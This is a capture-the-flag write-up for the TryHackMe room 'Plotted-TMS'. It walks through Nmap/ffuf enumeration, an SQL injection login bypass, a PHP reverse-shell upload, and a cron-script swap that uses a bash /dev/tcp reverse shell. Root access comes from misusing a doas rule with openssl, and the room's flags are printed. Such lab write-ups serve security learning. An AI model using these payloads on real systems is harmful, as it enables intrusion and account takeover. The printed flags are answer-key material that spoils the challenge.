## Plotted-TMS - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/plottedtms)

<i>Happy Hunting!

Tip: Enumeration is key!</i>

**IP: 10.10.242.82**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Ffuf<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan and a lot of fuzzing...

  ```
  nmap -sC -sV -T5 -p- 10.10.242.82

  PORT      STATE    SERVICE VERSION
  22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
  |   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
  |_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
  80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  445/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  59440/tcp filtered unknown
  59775/tcp filtered unknown
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  |_smb2-time: Protocol negotiation failed (SMB2)
  ```

  ```
  ffuf -u http://10.10.242.82/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 3707ms]
  shadow                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 48ms]
  passwd                  [Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 160ms]

  ffuf -u http://10.10.242.82:445/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  management              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 46ms]

  ffuf -u http://10.10.242.82:445/management/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  assets                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 45ms]
  admin                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 2004ms]
  pages                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 46ms]
  build                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 46ms]
  database                [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 47ms]
  uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 45ms]
  dist                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 46ms]
  classes                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 50ms]
  inc                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 45ms]
  plugins                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 47ms]
  libs                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 45ms]

  ffuf -u http://10.10.242.82:445/management/admin/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  reports                 [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 49ms]
  user                    [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 45ms]
  maintenance             [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 45ms]
  inc                     [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 52ms]
  drivers                 [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 47ms]
  ```
  
- On port 80 you can find some encoded strings.

  ```
  echo 'VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE' | base64 -d
  Trust me it is not this easy..now get back to enumeration :D

  echo 'bm90IHRoaXMgZWFzeSA6RA==' | base64 -d                                                        
  not this easy :D
  ```
  
- I moved to port 445 and found a login page. I tried for basic SQLI and well... Got in!

  ```
  admin' OR '1'='1' -- -
  test
  ```

---

## ⚙️ Shell Access

- Reverse shell time! Start a listener and upload a reverse shell as a new driver. You need to fill all inputs as well. I used PHP reverse shell. After uploading the shell just view drivers info in admin panel and you'll get a connection.

  ```
  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.242.82] 60062
  Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
   19:58:11 up 40 min,  0 users,  load average: 0.00, 0.01, 0.12
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  $ which python3
  /usr/bin/python3
  ```
  
- Change it to Putty shell and move on.

---

## 🧍 User Privilege Escalation

- First flag was easy to find but couldn't read it.

  ```
  www-data@plotted:/home$ cd plot_admin/
  www-data@plotted:/home/plot_admin$ ls -al
  total 32
  drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
  drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
  lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
  -rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
  -rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
  drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
  -rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
  drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
  -rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt
  
  www-data@plotted:/home/plot_admin$ cat user.txt 
  cat: user.txt: Permission denied
  ```
  
- When I checked cronjobs, I found my way to `plot_admin`.

  ```
  www-data@plotted:/var/www/scripts$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  * *     * * *   plot_admin /var/www/scripts/backup.sh

  www-data@plotted:/var/www/scripts$ cat backup.sh 
  #!/bin/bash
  
  /usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
  /bin/chmod -R 770 /home/plot_admin/tms_backup/management
  ```
  
- OK, we don't have access to edit the script but we have access to read/write in that whole directory.

  ```
  www-data@plotted:/var/www/scripts$ ls -al
  total 12
  drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
  drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
  -rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
  ```

- Now, we will create a fake script with a reverse shell and replace the original one with it. After that, start a listener and wait for cronjobs to run so you can get a connection.

  ```
  www-data@plotted:/var/www/scripts$ nano fake.sh
  Unable to create directory /var/www/.local/share/nano/: No such file or directory
  It is required for saving/loading search history or cursor positions.
  
  www-data@plotted:/var/www/scripts$ ls -al
  total 16
  drwxr-xr-x 2 www-data   www-data   4096 May 28 20:23 .
  drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
  -rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
  -rw-rw-rw- 1 www-data   www-data     55 May 28 20:23 fake.sh
  www-data@plotted:/var/www/scripts$ cat fake.sh 
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  
  
  www-data@plotted:/var/www/scripts$ mv backup.sh backup2.sh
  www-data@plotted:/var/www/scripts$ chmod +x fake.sh 
  www-data@plotted:/var/www/scripts$ mv fake.sh backup.sh
  www-data@plotted:/var/www/scripts$ ls -al
  total 16
  drwxr-xr-x 2 www-data   www-data   4096 May 28 20:23 .
  drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
  -rwxrwxrwx 1 www-data   www-data     55 May 28 20:23 backup.sh
  -rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup2.sh
  ```

  ```
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.242.82] 60084
  bash: cannot set terminal process group (40050): Inappropriate ioctl for device
  bash: no job control in this shell
  plot_admin@plotted:~$ whoami
  whoami
  plot_admin
  plot_admin@plotted:~$ id
  id
  uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
  ```

- Read the flag and move to root escalation.

---

## 👑 Root Privilege Escalation

- Here, I spent some time enumerating and found my way to root through SUID.

  ```
  plot_admin@plotted:~$ find / -type f -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
  -rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2284/bin/mount
  -rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2284/bin/ping
  -rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2284/bin/su
  -rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2284/bin/umount
  -rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2284/usr/bin/chfn
  -rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2284/usr/bin/chsh
  -rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2284/usr/bin/gpasswd
  -rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2284/usr/bin/newgrp
  -rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2284/usr/bin/passwd
  -rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2284/usr/bin/sudo
  -rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 436552 Aug 11  2021 /snap/core18/2284/usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2246/bin/mount
  -rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2246/bin/ping
  -rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2246/bin/su
  -rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2246/bin/umount
  -rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2246/usr/bin/chfn
  -rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2246/usr/bin/chsh
  -rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2246/usr/bin/gpasswd
  -rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2246/usr/bin/newgrp
  -rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2246/usr/bin/passwd
  -rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2246/usr/bin/sudo
  -rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 436552 Aug 11  2021 /snap/core18/2246/usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 85064 Jul 14  2021 /snap/core20/1328/usr/bin/chfn
  -rwsr-xr-x 1 root root 53040 Jul 14  2021 /snap/core20/1328/usr/bin/chsh
  -rwsr-xr-x 1 root root 88464 Jul 14  2021 /snap/core20/1328/usr/bin/gpasswd
  -rwsr-xr-x 1 root root 55528 Jul 21  2020 /snap/core20/1328/usr/bin/mount
  -rwsr-xr-x 1 root root 44784 Jul 14  2021 /snap/core20/1328/usr/bin/newgrp
  -rwsr-xr-x 1 root root 68208 Jul 14  2021 /snap/core20/1328/usr/bin/passwd
  -rwsr-xr-x 1 root root 67816 Jul 21  2020 /snap/core20/1328/usr/bin/su
  -rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1328/usr/bin/sudo
  -rwsr-xr-x 1 root root 39144 Jul 21  2020 /snap/core20/1328/usr/bin/umount
  -rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 /snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 473576 Dec  2  2021 /snap/core20/1328/usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 85064 Jul 14  2021 /snap/core20/1169/usr/bin/chfn
  -rwsr-xr-x 1 root root 53040 Jul 14  2021 /snap/core20/1169/usr/bin/chsh
  -rwsr-xr-x 1 root root 88464 Jul 14  2021 /snap/core20/1169/usr/bin/gpasswd
  -rwsr-xr-x 1 root root 55528 Jul 21  2020 /snap/core20/1169/usr/bin/mount
  -rwsr-xr-x 1 root root 44784 Jul 14  2021 /snap/core20/1169/usr/bin/newgrp
  -rwsr-xr-x 1 root root 68208 Jul 14  2021 /snap/core20/1169/usr/bin/passwd
  -rwsr-xr-x 1 root root 67816 Jul 21  2020 /snap/core20/1169/usr/bin/su
  -rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1169/usr/bin/sudo
  -rwsr-xr-x 1 root root 39144 Jul 21  2020 /snap/core20/1169/usr/bin/umount
  -rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 /snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 473576 Jul 23  2021 /snap/core20/1169/usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 123464 Jan  7  2022 /snap/snapd/14549/usr/lib/snapd/snap-confine
  -rwsr-xr-x 1 root root 115208 Oct  5  2021 /snap/snapd/13640/usr/lib/snapd/snap-confine
  -rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
  -rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
  -rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
  -rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
  -rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
  -rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
  -rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
  -rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
  -rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
  -rwsr-xr-x 1 root root 39008 Feb  5  2021 /usr/bin/doas
  -rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 19040 Jun  3  2021 /usr/libexec/polkit-agent-helper-1
  -rwsr-xr-x 1 root root 130408 Mar 26  2021 /usr/lib/snapd/snap-confine
  -rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
  ```
  
- If you look closely, you will see this bad boi `-rwsr-xr-x 1 root root 39008 Feb  5  2021 /usr/bin/doas`.

- To simplify it, `doas` acts as sudo so we can use it to read the flag, but not get full access to root which is enough for us. You can follow this [cool guide](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/).

  ```
  plot_admin@plotted:~$ find / -type f -name "doas.conf" 2>/dev/null
  /etc/doas.conf
  
  plot_admin@plotted:~$ cat /etc/doas.conf
  permit nopass plot_admin as root cmd openssl
  ```
  
- Perfect, when I tried to read the flag I got this:

  ```
  plot_admin@plotted:~$ doas -u root cat /root/root.txt
  doas: Operation not permitted
  ```

- Well, luckily GPT got my back and I read the flag by combining `doas` and `openssl`.

  ```
  plot_admin@plotted:~$ doas openssl enc -in "/root/root.txt"
  Congratulations on completing this room!
  
  53f85e2da3e874426fa059040a9bdcab
  
  Hope you enjoyed the journey!
  
  Do let me know if you have any ideas/suggestions for future rooms.
  -sa.infinity8888
  ```

- Enjoy and have fun!

---

## 🏁 Flags

- **User Flag**: `77927510d5edacea1f9e86602f1fbadb`
- **Root Flag**: `53f85e2da3e874426fa059040a9bdcab`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing really, just a lot of enumeration.`

- What did I learn?
  `New doas privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
